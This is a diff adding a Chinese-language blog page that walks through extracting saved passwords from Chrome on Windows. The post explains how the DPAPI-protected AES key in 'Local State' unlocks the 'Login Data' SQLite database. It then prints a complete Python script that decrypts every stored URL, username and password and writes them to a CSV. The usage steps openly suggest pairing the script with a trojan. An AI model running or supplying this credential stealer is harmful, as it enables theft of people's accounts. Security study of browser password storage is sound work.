@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Aoi Komiya">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://blog.komiya.monster/2023/12/25/chrome_passwd_leak/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Chrome 密码管理器信息泄露攻击的复现. No Safe in heart.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Browser-bulid-in passwd manager analysis">
+<meta property="og:url" content="https://blog.komiya.monster/2023/12/25/chrome_passwd_leak/index.html">
+<meta property="og:site_name" content="Aoi&#39;s BLOG">
+<meta property="og:description" content="Chrome 密码管理器信息泄露攻击的复现. No Safe in heart.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.komiya.monster/images/browser-bulid-in-passwd-manager-analysis/Local_State.png">
+<meta property="og:image" content="https://blog.komiya.monster/images/browser-bulid-in-passwd-manager-analysis/Login_Data.png">
+<meta property="og:image" content="https://blog.komiya.monster/images/browser-bulid-in-passwd-manager-analysis/login_sheet.png">
+<meta property="og:image" content="https://blog.komiya.monster/images/browser-bulid-in-passwd-manager-analysis/AES.webp">
+<meta property="article:published_time" content="2023-12-25T10:25:56.000Z">
+<meta property="article:modified_time" content="2024-10-07T08:36:55.535Z">
+<meta property="article:author" content="Aoi Komiya">
+<meta property="article:tag" content="Tech">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.komiya.monster/images/browser-bulid-in-passwd-manager-analysis/Local_State.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Browser-bulid-in passwd manager analysis -
+        
+        Aoi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/assets/fonts.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"blog.komiya.monster","root":"/","language":"en"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/winxp_bg.webp","dark":"/images/winxp_bg.webp"},"title":"Aoi's Blog","subtitle":{"text":["Ein  Niemand"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/index.html","icon":"fa-regular fa-archive"},"Friends":{"path":"/Friends_Link/index.html","icon":"fa-regular fa-userfa-solid fa-person-sign"},"Recent":{"path":"/Recent/index.html","icon":"fa-sharp fa-thin fa-signal-stream"},"About":{"icon":"fa-brands fa-linux","submenus":{"Me":"/AboutMe-Link/index.html","Github":"https://github.com/alizestl"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"cloud"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":"Ein Niemand","links":{"Archives":{"path":"/archives/index.html","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/index.html","icon":"fa-regular fa-tags"}}},"article_date_format":"YYYY-MM-DD","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Aoi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives/index.html"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/Friends_Link/index.html"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-userfa-solid fa-person-sign"></i>
+                                        
+                                        FRIENDS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/Recent/index.html"  >
+                                    
+                                        
+                                            <i class="fa-sharp fa-thin fa-signal-stream"></i>
+                                        
+                                        RECENT
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-brands fa-linux"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/AboutMe-Link/index.html">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/alizestl">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives/index.html"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/Friends_Link/index.html"  >
+                             
+                                
+                                    <i class="fa-regular fa-userfa-solid fa-person-sign"></i>
+                                
+                                FRIENDS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/Recent/index.html"  >
+                             
+                                
+                                    <i class="fa-sharp fa-thin fa-signal-stream"></i>
+                                
+                                RECENT
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-brands fa-linux"></i>
+                                
+                                ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" href="/AboutMe-Link/index.html">ME</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://github.com/alizestl">GITHUB</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+                      
+                <div class="article-title">
+                    <img src="/images/browser-bulid-in-passwd-manager-analysis/cover.png" alt="Browser-bulid-in passwd manager analysis" />
+                    <h1 class="article-title-cover">Browser-bulid-in passwd manager analysis</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/aoi_asito.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Aoi Komiya</span>
+                            
+                                <span class="author-label">Lv3</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-12-25 18:25:56</span>
+        <span class="mobile">2023-12-25 18:25</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-10-07 16:36:55</span>
+            <span class="mobile">2024-10-07 16:36</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Tech/">Tech</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Chrome129.0.6668.90</p>
+<p>同内核浏览器均可复现，改一下路径就行。</p>
+<p>PS. Firefox笔者未研究复现，但已知同样存在风险。</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ol>
+<li>AES Key明文存储在以下路径中，检索，处理后即可用</li>
+</ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;PC-name&gt;\AppData\Local\Google\Chrome\User Data\Local State</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/browser-bulid-in-passwd-manager-analysis/Local_State.png"
+                     
+                ></p>
+<p>key的处理涉及WindowsAPI的交互，涉及到的是win32下的一对加解密函数<a class="link"   target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata" >CryptProtectData <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和<a class="link"   target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata" >CryptUnprotectData <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。这俩函数对操作用户作出限制，即，加解密数据的用户必须为具有相同登录凭据的用户。 </p>
+<p>因此避免了一种攻击方式：将下面步骤2路径中提到的的Login Data传输到服务器，再解密。</p>
+<ol start="2">
+<li>浏览器保存密码的数据库路径：</li>
+</ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;PC-name&gt;\AppData\Local\Google\Chrome\User Data\Default\Login Data</span><br></pre></td></tr></table></figure></div>
+
+<p>直接记事本打开，可以辩认出是SQLite3</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/browser-bulid-in-passwd-manager-analysis/Login_Data.png"
+                     
+                ></p>
+<p>使用Navicat打开Login Data：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/browser-bulid-in-passwd-manager-analysis/login_sheet.png"
+                     
+                ></p>
+<p>可以发现，url、username是明文，passwd做了加密，加密方式是AES</p>
+<ol start="3">
+<li><p>Understand AES cryptography</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/browser-bulid-in-passwd-manager-analysis/AES.webp"
+                     
+                ></p>
+</li>
+</ol>
+<h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><p>基础AES加密的关键信息有两个：</p>
+<ul>
+<li>初始化向量 IV</li>
+<li>对称密钥 K</li>
+</ul>
+<p>IV是密文的第4-20个字符，passwd密文则是第21-倒数第17个字符。（也许用代码切片表示会更直接，中文写起来有点拗口，下面是英文）</p>
+<p>The initialization vector is stored between characters 4 to 20, while the encrypted password is stored between characters 21 to N-16 (i.e. total characters minus 16).</p>
+<p>因为AES是对称加密算法，直接用加密的密钥去解密即可。那么如何得到密钥呢？</p>
+<h4 id="使用Python的AES-MODE-GCM"><a href="#使用Python的AES-MODE-GCM" class="headerlink" title="使用Python的AES.MODE_GCM"></a>使用Python的AES.MODE_GCM</h4><p><strong>什么是GCM：</strong></p>
+<p>GCM是AES加密算法的一种模式，关键信息除了基础的IV和K，多了AAD与MAC tag</p>
+<ul>
+<li>Key：对称秘钥，长度可选值[128, 192, 256]bits。</li>
+<li>IV：初始向量(Initialisation Vector)，值必须随机。通常以明文的形式和密文一起传送，目的是防止同样的明文块，始终加密成同样的密文块。</li>
+<li>AAD：附加身份验证数据(Additional Authenticated Data)。AAD数据不需要加密，通常以明文的形式和密文一起传送。</li>
+<li>MAC tag：MAC标签。用于确保数据在传输和存储过程中不会被篡改。加密时，MAC tag由明文、密钥、IV、AAD共同产生。</li>
+</ul>
+<p>后续复现的时候，像如下两行python就可以实现（人生苦短，我用PY）</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cipher</span>(<span class="params">aes_key, iv</span>):</span><br><span class="line">    <span class="keyword">return</span> AES.new(aes_key, AES.MODE_GCM, iv)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<ol start="4">
+<li><p>Decrypt the saved passwords</p>
+<p>具体的实现看下面（</p>
+</li>
+</ol>
+<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="Dependence"><a href="#Dependence" class="headerlink" title="Dependence"></a>Dependence</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pycryptodomex==3.19.0</span><br><span class="line">pypiwin32==223</span><br><span class="line">pywin32==306</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> win32crypt</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># global const</span></span><br><span class="line">CHROME_PATH = os.path.normpath(<span class="string">r&quot;%s\AppData\Local\Google\Chrome\User Data&quot;</span> % (os.environ[<span class="string">&#x27;USERPROFILE&#x27;</span>]))</span><br><span class="line">CHROME_PATH_LOCAL_STATE = os.path.normpath(<span class="string">r&quot;%s\AppData\Local\Google\Chrome\User Data\Local State&quot;</span> % (os.environ[<span class="string">&#x27;USERPROFILE&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_db_connection</span>(<span class="params">chrome_path_login_db</span>):</span><br><span class="line">    <span class="built_in">print</span>(chrome_path_login_db)</span><br><span class="line">    shutil.copy2(chrome_path_login_db, <span class="string">&quot;Loginvault.db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> sqlite3.connect(<span class="string">&quot;Loginvault.db&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取明文存储在 CHROME_PATH_LOCAL_STATE 的 AES_KEY</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_k</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(CHROME_PATH_LOCAL_STATE, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        local_state = f.read()</span><br><span class="line">        local_state = json.loads(local_state)</span><br><span class="line">    k = base64.b64decode(local_state[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>])</span><br><span class="line">    <span class="comment"># Remove suffix DPAPI (Data Protection API)</span></span><br><span class="line">    k = k[<span class="number">5</span>:]</span><br><span class="line">    <span class="comment">#  Use API CryptUnprotectData win32</span></span><br><span class="line">    k = win32crypt.CryptUnprotectData(k, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成AES解密密钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cipher</span>(<span class="params">aes_key, iv</span>):</span><br><span class="line">    <span class="keyword">return</span> AES.new(aes_key, AES.MODE_GCM, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理AES对称加密后的密文，密文结构：iv (4 bits) + 被加密的密码密文 + suffix bytes (16 bits)</span></span><br><span class="line"><span class="comment"># 切片取出 iv 和 enc_passwd</span></span><br><span class="line"><span class="comment"># 生成AES解密密钥（iv + key）</span></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_password</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    iv = ciphertext[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    <span class="comment"># Removing suffix bytes (last 16 bits) and the encrypted password is 192 bits</span></span><br><span class="line">    enc_passwd = ciphertext[<span class="number">15</span>:-<span class="number">16</span>]</span><br><span class="line">    <span class="comment"># Build the cipher to decrypt the ciphertext</span></span><br><span class="line">    AES_dec_cipher = generate_cipher(key, iv)</span><br><span class="line">    dec_passwd = AES_dec_cipher.decrypt(enc_passwd).decode()</span><br><span class="line">    <span class="keyword">return</span> dec_passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Create .csv file to store passwords</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decrypted_password.csv&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> decrypt_password_file:</span><br><span class="line">            csv_writer = csv.writer(decrypt_password_file, delimiter=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            csv_writer.writerow([<span class="string">&quot;index&quot;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>])</span><br><span class="line">            <span class="comment"># (1) Get secret key</span></span><br><span class="line">            secret_key = get_k()</span><br><span class="line">            <span class="comment"># Search directory  where the encrypted login password is stored</span></span><br><span class="line">            folders = [element <span class="keyword">for</span> element <span class="keyword">in</span> os.listdir(CHROME_PATH) <span class="keyword">if</span> re.search(<span class="string">&quot;^Profile*|^Default$&quot;</span>, element) != <span class="literal">None</span>]</span><br><span class="line">            <span class="comment"># folders = [&#x27;Default&#x27;]</span></span><br><span class="line">            <span class="keyword">for</span> folder <span class="keyword">in</span> folders:</span><br><span class="line">                <span class="comment"># (2) Get ciphertext from sqlite database</span></span><br><span class="line">                chrome_path_login_db = os.path.normpath(<span class="string">r&quot;%s\%s\Login Data&quot;</span> % (CHROME_PATH, folder))</span><br><span class="line">                conn = get_db_connection(chrome_path_login_db)</span><br><span class="line">                <span class="keyword">if</span> secret_key <span class="keyword">and</span> conn:</span><br><span class="line">                    cursor = conn.cursor()</span><br><span class="line">                    cursor.execute(<span class="string">&quot;SELECT action_url, username_value, password_value FROM logins&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> index, login <span class="keyword">in</span> <span class="built_in">enumerate</span>(cursor.fetchall()):</span><br><span class="line">                        url = login[<span class="number">0</span>]</span><br><span class="line">                        username = login[<span class="number">1</span>]</span><br><span class="line">                        ciphertext = login[<span class="number">2</span>]</span><br><span class="line">                        <span class="keyword">if</span> (url != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> username != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> ciphertext != <span class="string">&quot;&quot;</span>):</span><br><span class="line">                            <span class="comment"># (3) Filter the initialisation vector &amp; encrypted password from ciphertext</span></span><br><span class="line">                            <span class="comment"># (4) Use AES algorithm to decrypt the password</span></span><br><span class="line">                            decrypted_password = decrypt_password(ciphertext, secret_key)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;Index: %d&quot;</span> % index)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;URL: %s\nUser Name: %s\nPassword: %s\n&quot;</span> % (url, username, decrypted_password))</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> * <span class="number">50</span>)</span><br><span class="line">                            <span class="comment"># (5) Save into CSV</span></span><br><span class="line">                            csv_writer.writerow([index, url, username, decrypted_password])</span><br><span class="line">                    <span class="comment"># Close database connection</span></span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    <span class="comment"># Delete temp login db</span></span><br><span class="line">                    os.remove(<span class="string">&quot;Loginvault.db&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[ERR] %s&quot;</span> % (<span class="built_in">str</span>(e)))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="食用方式"><a href="#食用方式" class="headerlink" title="食用方式"></a>食用方式</h2><ol>
+<li><p>配合木马进行攻击（</p>
+</li>
+<li><p>安装依赖</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>运行脚本</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python script_name.py</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/uaXz4-2wFcSsmKvNLqXOXw%EF%BC%8824-10-7%E6%9B%B4%E6%96%B0%EF%BC%8C%E5%A4%B1%E6%95%88%EF%BC%89" >https://mp.weixin.qq.com/s/uaXz4-2wFcSsmKvNLqXOXw（24-10-7更新，失效） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.v2ex.com/t/872745" >https://www.v2ex.com/t/872745 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d" >https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41077112/article/details/132965269" >https://blog.csdn.net/weixin_41077112/article/details/132965269 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Browser-bulid-in passwd manager analysis</li>
+        <li><strong>Author:</strong> Aoi Komiya</li>
+        <li><strong>Created at:</strong> 2023-12-25 18:25:56</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2024-10-07 16:36:55
+            </li>
+        
+        <li>
